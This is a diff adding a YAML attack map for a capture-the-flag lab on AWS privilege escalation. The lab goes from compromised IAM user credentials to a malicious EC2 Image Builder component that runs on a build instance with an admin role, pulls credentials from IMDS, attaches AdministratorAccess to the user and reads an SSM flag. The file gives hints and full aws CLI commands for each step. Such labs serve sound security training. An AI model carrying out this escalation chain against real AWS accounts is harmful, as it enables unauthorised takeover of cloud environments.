@@ -1,0 +1,150 @@
+attackMap:
+  nodes:
+    - id: starting-user
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-imagebuilder-001-to-admin-starting-user"
+      access:
+        type: assumed-breach-credentials
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could
+        have been obtained through many real-world vectors: phishing a developer,
+        compromising a workstation, finding credentials in source code or a CI/CD
+        pipeline, or discovering them in a misconfigured S3 bucket.
+
+        This IAM user has iam:PassRole on the admin instance profile role,
+        imagebuilder:CreateComponent, imagebuilder:CreateImageRecipe,
+        imagebuilder:CreateInfrastructureConfiguration, and imagebuilder:CreateImage.
+        Together these permissions let you build an EC2 Image Builder pipeline whose
+        component shell commands execute on a build instance running with admin
+        credentials available via IMDS.
+
+    - id: build-instance
+      label: "EC2 Build Instance (admin role)"
+      type: resource
+      subType: ec2-instance
+      arn: "arn:aws:ec2:{region}:{account_id}:instance/*"
+      description: >
+        An EC2 instance launched by EC2 Image Builder to execute the image build.
+        The instance is launched with the admin instance profile specified in the
+        infrastructure configuration, making the admin role's credentials available
+        via the Instance Metadata Service (IMDS). Component shell commands run on
+        this instance with full access to the admin role credentials.
+
+    - id: admin-role
+      label: "Admin Role (ec2.amazonaws.com trust)"
+      type: principal
+      subType: iam-role
+      isAdmin: true
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-imagebuilder-001-to-admin-admin-role"
+      description: >
+        An IAM role with AdministratorAccess attached, trusting ec2.amazonaws.com.
+        It is attached to the EC2 build instance via an instance profile. The
+        component's shell commands retrieve temporary credentials from IMDS and use
+        them to call iam:AttachUserPolicy, granting the starting user full admin
+        access. This role is the pivot — it holds the admin permissions but the
+        actual flag terminal is the SSM parameter accessible by the newly elevated
+        starting user.
+
+    - id: ctf-flag
+      label: "CTF Flag"
+      type: resource
+      subType: ssm-parameter
+      isTarget: true
+      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/imagebuilder-001-to-admin"
+      description: >
+        The CTF flag for this scenario, stored as an SSM parameter in the victim
+        account. Retrieving it requires administrator-equivalent permissions
+        (ssm:GetParameter is granted implicitly by AdministratorAccess). Your goal
+        is to read this parameter using the admin access gained from the previous step.
+
+  edges:
+    - from: starting-user
+      to: build-instance
+      label: "imagebuilder:Create* + iam:PassRole"
+      description: >
+        The starting user creates a malicious Image Builder component containing
+        shell commands, assembles an image recipe referencing that component, creates
+        an infrastructure configuration that passes the admin role's instance profile
+        (iam:PassRole), then triggers a build with imagebuilder:CreateImage. EC2
+        Image Builder launches an EC2 build instance with the admin instance profile
+        attached.
+      hints:
+        - "Create an Image Builder component using a YAML document with an ExecuteBash action. The shell commands should retrieve IMDS credentials and call aws iam attach-user-policy."
+        - "CreateImageRecipe requires GetComponent, GetImage, and ec2:DescribeImages as dependent actions. CreateImage requires GetImageRecipe and GetInfrastructureConfiguration. All Create* require TagResource."
+        - "Pass the admin instance profile name (not ARN) to imagebuilder create-infrastructure-configuration via --instance-profile-name."
+      commands:
+        - description: "Create the malicious component with shell commands that use IMDS credentials"
+          command: >
+            aws imagebuilder create-component
+              --name pl-prod-imagebuilder-001-to-admin-component
+              --semantic-version 1.0.0
+              --platform Linux
+              --data "$(cat component.yaml)"
+        - description: "Retrieve the latest Amazon Linux 2023 AMI ID via SSM public parameter"
+          command: >
+            aws ssm get-parameter
+              --name /aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64
+              --query 'Parameter.Value' --output text
+        - description: "Create the image recipe referencing the malicious component"
+          command: >
+            aws imagebuilder create-image-recipe
+              --name pl-prod-imagebuilder-001-to-admin-recipe
+              --semantic-version 1.0.0
+              --parent-image <base-ami-id>
+              --components componentArn=<component-arn>
+        - description: "Create the infrastructure configuration, passing the admin instance profile"
+          command: >
+            aws imagebuilder create-infrastructure-configuration
+              --name pl-prod-imagebuilder-001-to-admin-infra-config
+              --instance-profile-name pl-prod-imagebuilder-001-to-admin-admin-profile
+              --instance-types t3.medium
+              --subnet-id <subnet-id>
+              --security-group-ids <sg-id>
+              --terminate-instance-on-failure
+        - description: "Trigger the image build (launches EC2 instance with admin role)"
+          command: >
+            aws imagebuilder create-image
+              --image-recipe-arn <recipe-arn>
+              --infrastructure-configuration-arn <infra-config-arn>
+
+    - from: build-instance
+      to: admin-role
+      label: "assumes role via IMDS + iam:AttachUserPolicy"
+      description: >
+        The component's shell commands run on the build instance during the build
+        phase (10-30+ minutes after the CreateImage call). The commands use IMDSv2
+        to retrieve temporary credentials for the admin role, then call
+        iam:AttachUserPolicy to attach AdministratorAccess to the starting user.
+        The build instance executes these commands with no user interaction.
+      hints:
+        - "Poll imagebuilder:GetImage for the build status. Once the build phase begins, the component runs. The image may ultimately FAIL (because no valid AMI is produced from a t3.medium without an EBS volume configuration) but the iam:AttachUserPolicy call will have already executed."
+        - "Check iam:ListAttachedUserPolicies on the starting user. The AdministratorAccess policy should appear once the component has run."
+      commands:
+        - description: "Poll image build status"
+          command: >
+            aws imagebuilder get-image
+              --image-build-version-arn <image-build-arn>
+              --query 'image.state.status' --output text
+        - description: "Verify AdministratorAccess is attached to the starting user"
+          command: >
+            aws iam list-attached-user-policies
+              --user-name pl-prod-imagebuilder-001-to-admin-starting-user
+              --query 'AttachedPolicies[*].PolicyArn' --output text
+
+    - from: admin-role
+      to: ctf-flag
+      label: "Read CTF flag"
+      description: >
+        With AdministratorAccess now attached to the starting user, retrieve the
+        scenario flag from SSM Parameter Store. AdministratorAccess grants
+        ssm:GetParameter on all parameters in the account, so no additional
+        permissions are needed beyond the admin access just gained.
+      hints:
+        - "You now hold admin-equivalent credentials. The scenario flag is stored in an AWS service commonly used to hold configuration values and small secrets."
+        - "Scenario flags live under a shared prefix in SSM Parameter Store — consider what a reasonable naming convention for this lab might look like."
+        - "Use ssm:GetParameter with the full parameter name to retrieve the flag value."
+      commands:
+        - description: "Retrieve the CTF flag from SSM Parameter Store"
+          command: "aws ssm get-parameter --name /pathfinding-labs/flags/imagebuilder-001-to-admin --query 'Parameter.Value' --output text"
